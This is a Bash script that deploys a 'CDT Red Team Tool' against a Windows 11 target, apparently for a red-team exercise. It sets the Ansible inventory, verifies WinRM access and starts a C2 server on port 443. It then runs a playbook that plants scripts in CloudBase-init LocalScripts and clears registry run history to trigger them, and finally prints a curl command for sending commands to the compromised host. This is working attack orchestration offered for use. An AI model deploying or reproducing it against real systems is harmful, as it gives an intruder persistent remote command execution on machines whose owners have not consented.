#!/bin/bash
# deploy.sh

# Master deployment script for the CDT Red Team Tool.
# Automates the entire process of targeting a new Windows 11 machine:
# updates the inventory with the target IP, verifies connectivity,
# starts the C2 server, runs the Ansible playbook, and prints a
# ready-to-use curl command for issuing commands to the compromised target.
#
# Usage:
#   ./deploy.sh <WINDOWS_IP>
#
# Example:
#   ./deploy.sh 100.65.7.152
#
# Prerequisites:
#   - WinRM must already be enabled on the target (run the one-liner on Windows first)
#   - setup_kali.sh must have been run at least once on this Kali machine
#   - cert.pem and key.pem must exist in the repo root

# ── Argument validation ───────────────────────────────────────────────────────
# Check that a Windows IP was passed as the first argument.
# If not, print usage instructions and exit with a non-zero code
# so the operator knows immediately what went wrong.

if [ -z "$1" ]; then
    echo "Usage: ./deploy.sh <WINDOWS_IP>"
    exit 1
fi

# Store the Windows target IP and the absolute path to the script's
# directory so all subsequent commands work regardless of where the
# operator ran this script from.
WINDOWS_IP=$1
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ── Update inventory.ini with target IP ──────────────────────────────────────
# Uses sed to find the ansible_host line in inventory.ini and replace
# whatever IP is currently there with the new target IP passed as an argument.
# The .* after ansible_host= matches any existing value so this works
# whether inventory.ini has a placeholder or a previous target's IP.
echo "[*] Updating inventory.ini with target IP: $WINDOWS_IP"
sed -i "s/ansible_host=.*/ansible_host=$WINDOWS_IP/" inventory.ini

# ── Test Ansible connectivity to target ──────────────────────────────────────
# Runs the Ansible win_ping module against the target before attempting
# deployment. win_ping is a lightweight connectivity test specific to
# Windows that verifies WinRM is reachable and credentials are correct.
# 2>&1 captures both stdout and stderr into PING_RESULT so we can
# check the output regardless of which stream Ansible writes to.
echo "[*] Testing connectivity..."
PING_RESULT=$(ansible windows -i inventory.ini -m win_ping 2>&1)

# Check if the output contains pong which is the success response from win_ping.
# If connectivity fails we print the full Ansible error output to help the
# operator diagnose the problem, then exit so we do not attempt deployment
# against an unreachable target.
if echo "$PING_RESULT" | grep -q "pong"; then
    echo "[+] Connectivity confirmed - target is reachable"
else
    echo "[-] Connectivity failed. Output:"
    echo "$PING_RESULT"
    echo ""
    echo "Make sure WinRM is enabled on the target and try again."
    exit 1
fi

# ── Start C2 server in background ────────────────────────────────────────────
# Starts c2_server.py as a background process using & so the script
# continues without waiting for the server to exit. sudo is required
# because port 443 is a privileged port that requires root to bind.
# $! captures the process ID of the last background process started
# so we can display it to the operator for reference if they need
# to kill the server manually later.
echo "[*] Starting C2 server in background..."
sudo python3 "$SCRIPT_DIR/c2_server.py" &
C2_PID=$!
echo "[+] C2 server started with PID $C2_PID"

# ── Run Ansible deployment playbook ──────────────────────────────────────────
# Executes deploy.yml which handles all remote tasks on the Windows target:
# dropping scripts into CloudBase-init LocalScripts, clearing the registry
# run history, restarting CloudBase-init to trigger execution, and waiting
# for the scripts to finish running. All connection parameters are read
# from inventory.ini automatically.
echo "[*] Running deployment playbook..."
ansible-playbook deploy.yml -i inventory.ini

# ── Print deployment summary ──────────────────────────────────────────────────
echo ""
echo "[+] Deployment complete."
echo "[+] C2 server is running in background (PID $C2_PID)"
echo ""

# ── Automatically retrieve target hostname ────────────────────────────────────
# Runs the hostname command on the target via Ansible and extracts the
# clean hostname string from the output. The grep -v commands filter out
# Ansible status lines like CHANGED and blank lines. tail -1 takes the
# last remaining line which is the actual hostname. tr -d removes any
# trailing whitespace or carriage return characters that would break
# the curl command printed below.
HOSTNAME=$(ansible windows -i inventory.ini -m win_shell -a "hostname" 2>&1 | grep -v "CHANGED" | grep -v "^$" | tail -1 | tr -d '[:space:]')
echo "[+] Target hostname: $HOSTNAME"
echo ""

# ── Print ready-to-use curl command ──────────────────────────────────────────
# Prints a complete curl command with the correct hostname already filled in
# so the operator can immediately start issuing commands without having to
# manually look up the hostname or construct the JSON payload themselves.
# -sk tells curl to skip certificate validation (needed for self-signed cert)
# and suppress progress output.
echo "To issue commands:"
echo "  curl -sk -X POST https://localhost/issue \\"
echo "    -H 'Content-Type: application/json' \\"
echo "    -d '{\"id\": \"$HOSTNAME\", \"cmd\": \"whoami\"}'"
echo ""
echo "To view C2 output, check your terminal or run:"
echo "  tail -f /tmp/c2.log"